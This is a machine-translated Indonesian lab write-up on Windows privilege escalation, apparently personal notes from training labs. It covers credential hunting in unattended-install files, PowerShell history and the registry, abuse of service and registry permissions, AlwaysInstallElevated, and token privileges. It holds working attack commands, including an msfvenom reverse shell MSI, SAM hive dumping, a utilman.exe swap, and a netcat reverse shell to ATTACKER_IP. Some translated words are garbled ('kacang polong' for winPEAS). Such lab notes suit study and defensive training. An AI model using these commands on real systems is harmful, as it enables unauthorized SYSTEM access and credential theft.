---
title: "Windows Privesc"
description: "Mengumpulkan Kata Sandi dari Tempat-Tempat yang Biasa Digunakan Saat Instalasi Windows Tanpa Pengawasan Ketika menginstal Windows pada sejumlah besar host, administrator dapat menggunakan Windows Deployment Services,"
lang: "id"
translationKey: "windows-privesc"
category: "lab-writeups"
tags: []
publishDate: "2024-12-10"
draft: true
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "1585fca1-ed80-806d-a993-ea99d7dca166"
notionUrl: "https://app.notion.com/p/Windows-Privesc-1585fca1ed80806da993ea99d7dca166"
notionLastEdited: "2025-01-09T23:42:00.000Z"
---

# Mengumpulkan Kata Sandi dari Tempat-Tempat Biasa

## **Instalasi Windows Tanpa Pengawasan**

Saat menginstal Windows pada sejumlah besar host, administrator dapat menggunakan Windows Deployment Services, yang memungkinkan satu citra sistem operasi untuk disebarkan ke beberapa host melalui jaringan. Instalasi semacam ini disebut sebagai instalasi tanpa pengawasan.
Instalasi tersebut tidak memerlukan interaksi pengguna. Instalasi semacam itu memerlukan penggunaan akun administrator untuk melakukan pengaturan awal, yang mungkin akan tersimpan di mesin pada lokasi berikut:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml
## **Riwayat PowerShell**

```bash
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## **Kredensial Windows Tersimpan**

Perintah di bawah ini akan menampilkan daftar kredensial yang tersimpan:

```text
cmdkey /list
```

Meskipun Anda tidak dapat melihat kata sandi sebenarnya, jika Anda menemukan kredensial yang layak dicoba, Anda dapat menggunakannya dengan perintah `runas` dan opsi `/savecred`, seperti yang terlihat di bawah ini.

```text
runas /savecred /user:admin cmd.exe
```

### Simpan Kredensial di Registri

kacang polong:

```bash
winpeas.exe quiet filesinfo userinfo
```

![](/images/windows-privesc/fd8a2a8be5db.png)

![](/images/windows-privesc/1527903f81e2.png)

### Kredensial Tersimpan di CMD

```bash
winpeas.exe quiet cmd windowscreds
```

![](/images/windows-privesc/0e4816dca304.png)

## Konfigurasi IIS

Internet Information Services (IIS) adalah server web default pada instalasi Windows. Konfigurasi situs web di IIS disimpan dalam file bernama `web.config` dan dapat menyimpan kata sandi untuk
basis data atau mekanisme otentikasi yang dikonfigurasi. Tergantung pada versi IIS yang terpasang, kita dapat menemukan web.config di salah satu lokasi berikut:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
## **Mengambil Kredensial dari Perangkat Lunak: PuTTY**

Untuk mengambil kredensial proxy yang tersimpan, Anda dapat mencari ProxyPassword di bawah kunci registri berikut dengan perintah berikut:

```text
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

## **Tugas Terjadwal**

```bash
# list scheduled task
schtasks /query /tn vulntask /fo list /v
# running task 
schtasks /run /tn vulntask
# task view
tasklist /V | findstr mspaint.exe
# check startapp 
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

## Eksploitasi Layanan Windows

### Jalur Layanan Tanpa Tanda Kutip atau Nama Layanan itu Sendiri

```bash
# Check service exploit using script powerup.ps1
. ./powerup.ps1
Invoke-AllChecks
# see detail about service
sc qc <service name>
# start & stop the service
sc start <service name>
sc stop <service name>
```

### **Izin yang Tidak Aman pada File Eksekusi Layanan**

kacang polong:

![](/images/windows-privesc/feca08c5575d.png)

Kita dapat mengubah file .exe yang terkait dengan layanan tersebut karena kita memiliki izin modifikasi pada file .exe tersebut.

Lakukan kueri pada layanan "filepermsvc" dan perhatikan bahwa layanan tersebut berjalan dengan hak akses SYSTEM (SERVICE_START_NAME).

`sc qc filepermsvc`

Saat menggunakan accesschk.exe, perhatikan bahwa file biner layanan (BINARY_PATH_NAME) dapat ditulis oleh siapa saja:

`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

Salin file executable reverse.exe yang telah Anda buat dan ganti file filepermservice.exe dengan file tersebut:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

Jalankan listener di Kali Linux, lalu jalankan layanan untuk membuat reverse shell yang berjalan dengan hak akses SYSTEM:

`net start filepermsvc`

### **Izin Layanan yang Tidak Aman**

kacang polong:

![](/images/windows-privesc/9f4942082e1c.png)

periksa izin pengguna pada layanan tertentu

```bash
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

memeriksa izin pada akun tertentu untuk suatu layanan

```bash
accesschk.exe /accepteula -uwcqv user daclsvc
```

Jika pengguna Anda hanya memiliki izin **SERVICE_CHANGE_CONFIG**, Anda dapat menyalahgunakan konfigurasi jalur seperti ini.

```bash
# Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

sc.exe config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
# then restart the service for trigerring
```

## Eksploitasi Registri

### Izin Registri yang Lemah

kacang polong:

![](/images/windows-privesc/671fe5e7b074.png)

Lakukan kueri pada layanan "regsvc" dan perhatikan bahwa layanan tersebut berjalan dengan hak akses SYSTEM (SERVICE_START_NAME).

`sc qc regsvc`

Dengan menggunakan accesschk.exe, perhatikan bahwa entri registri untuk layanan regsvc dapat ditulis oleh grup "NT AUTHORITY\INTERACTIVE" (pada dasarnya semua pengguna yang masuk):

`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

Timpa kunci registri ImagePath agar mengarah ke file executable reverse.exe yang telah Anda buat:

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

Jalankan listener di Kali Linux, lalu jalankan layanan untuk membuat reverse shell yang berjalan dengan hak akses SYSTEM:

`net start regsvc`

### AutoRuns

kacang polong:

![](/images/windows-privesc/81f182c912f2.png)

Lakukan kueri registri untuk executable AutoRun:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Saat menggunakan accesschk.exe, perhatikan bahwa salah satu file eksekusi AutoRun dapat ditulis oleh semua orang:

`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

Salin file eksekusi reverse.exe yang telah Anda buat dan timpa file eksekusi AutoRun dengan file tersebut:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

Jalankan listener di Kali Linux, lalu restart VM Windows. Buka sesi RDP baru untuk memicu reverse shell yang berjalan dengan hak akses admin. Anda seharusnya tidak perlu melakukan autentikasi untuk memicunya, namun jika payload tidak berjalan, masuk sebagai admin (admin/password123) untuk memicunya. Perlu diingat bahwa dalam situasi nyata, Anda harus menunggu administrator untuk masuk terlebih dahulu!

`rdesktop 10.10.80.243`

### SelaluInstal dengan Hak Akses Tinggi

kacang polong:

![](/images/windows-privesc/05076a0fb39b.png)

Lakukan kueri registri untuk kunci AlwaysInstallElevated:

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Perhatikan bahwa kedua kunci diatur ke 1 (0x1).

Di Kali Linux, buat Windows Installer reverse shell (reverse.msi) menggunakan msfvenom. Perbarui alamat IP LHOST sesuai kebutuhan:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

Transfer file reverse.msi ke direktori C:\PrivEsc di Windows (gunakan metode server SMB dari sebelumnya). Mulai listener di Kali dan kemudian jalankan installer untuk memicu reverse shell yang berjalan dengan hak akses SYSTEM:

`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

## Pengguna dengan Hak Istimewa

```bash
whoami /priv
```

### **SeBackup / SeRestore**

![](/images/windows-privesc/c67760b65cc9.png)

Untuk mencadangkan hash SAM dan SYSTEM, kita dapat menggunakan perintah berikut:

```bash
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

### **SeTakeOwnership**

![](/images/windows-privesc/2da4560ecc5a.png)


Kita akan menyalahgunakan `utilman.exe` untuk meningkatkan hak akses kali ini. Utilman adalah aplikasi bawaan Windows yang digunakan untuk menyediakan opsi Aksesibilitas selama layar kunci:

Karena Utilman dijalankan dengan hak akses SYSTEM, kita secara efektif akan mendapatkan hak akses SYSTEM jika kita mengganti biner asli dengan muatan apa pun yang kita inginkan. Karena kita dapat mengambil kepemilikan file apa pun, menggantinya sangat mudah.

Untuk mengganti utilman, kita akan mulai dengan mengambil alih kepemilikannya dengan perintah berikut:

```bash
takeown /f C:\Windows\System32\Utilman.exe
```

Perhatikan bahwa menjadi pemilik file tidak selalu berarti Anda memiliki hak akses penuh atas file tersebut, tetapi sebagai pemilik Anda dapat memberikan hak akses penuh apa pun yang Anda butuhkan. Untuk memberikan izin penuh kepada pengguna Anda atas utilman.exe, Anda dapat menggunakan perintah berikut:

```bash
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

Setelah ini, kita akan mengganti utilman.exe dengan salinan cmd.exe:

```bash
copy cmd.exe utilman.exe
```

Kemudian, saat kita menjalankan utilman.exe, kita akan diminta untuk memasukkan perintah cmd sebagai localsystem.

![](/images/windows-privesc/97cc9dda383d.png)

![](/images/windows-privesc/56735b388397.png)

### **SeImpersonate / SeAssignPrimaryToken**

![](/images/windows-privesc/130175274d82.png)

Kita dapat memanfaatkannya dengan menggunakan kentang atau alat berikut:

```bash
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

Referensi:

- [https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato)
- 
## Penyalahgunaan perangkat lunak yang rentan

Cobalah mencari perangkat lunak yang rentan di dalam sistem operasi, seperti perangkat lunak yang belum diperbarui atau lainnya.
